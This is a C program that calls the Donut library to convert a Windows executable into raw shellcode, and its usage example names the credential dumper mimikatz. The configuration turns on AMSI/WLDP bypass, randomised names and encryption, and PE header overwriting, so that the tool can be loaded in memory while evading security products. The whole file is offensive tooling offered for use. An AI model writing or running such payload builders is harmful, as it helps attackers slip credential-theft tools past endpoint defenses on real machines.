#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "donut.h"

int main(int argc, char *argv[]) {
    DONUT_CONFIG config;
    int err;

    // Check command line arguments
    if (argc < 2) {
        printf("Usage: %s <input_executable> [output_payload]\n", argv[0]);
        printf("Example: %s C:\\tools\\mimikatz.exe custom_payload.bin\n", argv[0]);
        return 1;
    }

    // Initialize the configuration structure to zero
    memset(&config, 0, sizeof(DONUT_CONFIG));
    
    // Input and output files
    strncpy(config.input, argv[1], DONUT_MAX_NAME - 1);
    
    // If output file is provided via CLI, use it. Otherwise, default to "payload.bin"
    if (argc >= 3) {
        strncpy(config.output, argv[2], DONUT_MAX_NAME - 1);
    } else {
        strncpy(config.output, "payload.bin", DONUT_MAX_NAME - 1);
    }
    
    // Configure parameters
    config.inst_type = DONUT_INSTANCE_EMBED;    // File is embedded in the shellcode
    config.arch      = DONUT_ARCH_X84;          // Dual-mode (x86 + amd64)
    config.bypass    = DONUT_BYPASS_CONTINUE;   // Continue if AMSI/WLDP bypass fails
    config.headers   = DONUT_HEADERS_OVERWRITE; // Overwrite PE headers (To prevent abortion)
    config.format    = DONUT_FORMAT_BINARY;     // Binary output format (raw shellcode)
    config.compress  = DONUT_COMPRESS_NONE;     // No compression by default
    config.entropy   = DONUT_ENTROPY_DEFAULT;   // Random names and encryption enabled
    config.exit_opt  = DONUT_OPT_EXIT_THREAD;   // Exit behavior: ExitThread
    config.unicode   = 0;                       // No unicode conversion for command line

    puts("[*] Generating shellcode with Donut...");

    err = DonutCreate(&config);

    // Validate using DONUT_ERROR_OK (0)
    if (err == DONUT_ERROR_OK) {
        printf("[+] Shellcode successfully generated at: %s\n", config.output);
        printf("[+] Shellcode size: %d bytes\n", config.pic_len);
    } else {
        printf("[-] Error generating shellcode. Error message: %s\n", DonutError(err));
    }

    // Clean up memory 
    DonutDelete(&config);

    // END :O
    return 0;
}